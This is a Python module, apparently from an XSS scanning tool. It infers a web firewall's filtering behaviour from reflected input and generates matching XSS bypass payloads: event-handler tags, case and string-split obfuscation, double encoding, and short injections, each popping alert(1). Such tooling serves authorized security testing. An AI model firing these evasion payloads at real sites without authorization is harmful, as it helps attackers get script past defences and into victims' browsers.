"""Heuristic XSS bypass generation."""

from __future__ import annotations

import html

try:
    from .payload_sets import get_payloads_for_context, get_waf_bypass_payloads
except ImportError:  # pragma: no cover
    from payload_sets import get_payloads_for_context, get_waf_bypass_payloads


class BypassGenerator:
    """Generate WAF bypass variants based on filter detection."""

    def detect_filter_type(self, payload: str, reflected_fragment: str, response_text: str = "") -> str:
        """Classify the likely filter behavior from reflection results."""
        payload_lower = payload.lower()
        fragment_lower = (reflected_fragment or "").lower()
        response_lower = (response_text or "").lower()

        if not reflected_fragment:
            if any(keyword in payload_lower for keyword in ("<script", "<img", "<svg", "<iframe")):
                return "STRICT_TAG_BLOCK"
            return "KEYWORD_BLOCK"

        if 0 < len(reflected_fragment) < max(3, len(payload) * 0.7):
            return "LENGTH_BLOCK"

        if reflected_fragment != payload:
            if reflected_fragment == html.escape(payload) or reflected_fragment.startswith("%3c") or "&lt;" in fragment_lower:
                return "ENCODING_BLOCK"
            if any(keyword in payload_lower for keyword in ("script", "alert", "onerror", "onload")):
                missing = [
                    keyword
                    for keyword in ("script", "alert", "onerror", "onload")
                    if keyword in payload_lower and keyword not in fragment_lower
                ]
                if missing:
                    if any(keyword.startswith("on") for keyword in missing):
                        return "EVENT_HANDLER_BLOCK"
                    return "KEYWORD_BLOCK"

        if any(keyword in payload_lower for keyword in ("onerror", "onload", "onfocus", "onmouseover")):
            if not any(keyword in fragment_lower for keyword in ("onerror", "onload", "onfocus", "onmouseover")):
                return "EVENT_HANDLER_BLOCK"

        if reflected_fragment != payload and response_lower.count("blocked") >= 1:
            return "KEYWORD_BLOCK"

        return "NO_BLOCK"

    def generate(self, filter_type: str, context: str) -> list[str]:
        """Generate bypass payloads for the detected filter type."""
        payloads = []
        payloads.extend(get_payloads_for_context(context)[:3])
        payloads.extend(get_waf_bypass_payloads(filter_type, context))
        if filter_type == "STRICT_TAG_BLOCK":
            payloads.extend(
                [
                    "</textarea><svg/onload=alert(1)>",
                    "<style>@import'javascript:alert(1)'</style>",
                    "<svg><foreignObject><iframe src=javascript:alert(1)>",
                ]
            )
        elif filter_type == "EVENT_HANDLER_BLOCK":
            payloads.extend(
                [
                    "<marquee onstart=alert(1)>",
                    "<details open ontoggle=alert(1)>",
                    "<svg><animate onbegin=alert(1) attributeName=x>",
                ]
            )
        elif filter_type == "KEYWORD_BLOCK":
            payloads.extend(
                [
                    "<ScRiPt>top['al'+'ert'](1)</ScRiPt>",
                    "<img src=x oNerror=top['al'+'ert'](1)>",
                    "<svg/onload=top['co'+'nfirm'](1)>",
                ]
            )
        elif filter_type == "ENCODING_BLOCK":
            payloads.extend(
                [
                    "%253Csvg%2520onload%253Dalert(1)%253E",
                    "&lt;svg onload=alert(1)&gt;",
                    r"\u003csvg onload=alert(1)\u003e",
                ]
            )
        elif filter_type == "LENGTH_BLOCK":
            payloads.extend(
                [
                    "<svg/onload=1>",
                    "';alert?.(1)//",
                    '"><svg/onload=1>',
                ]
            )
        return self._unique(payloads)

    def _unique(self, values: list[str]) -> list[str]:
        seen: set[str] = set()
        unique_values: list[str] = []
        for value in values:
            if value not in seen:
                seen.add(value)
                unique_values.append(value)
        return unique_values
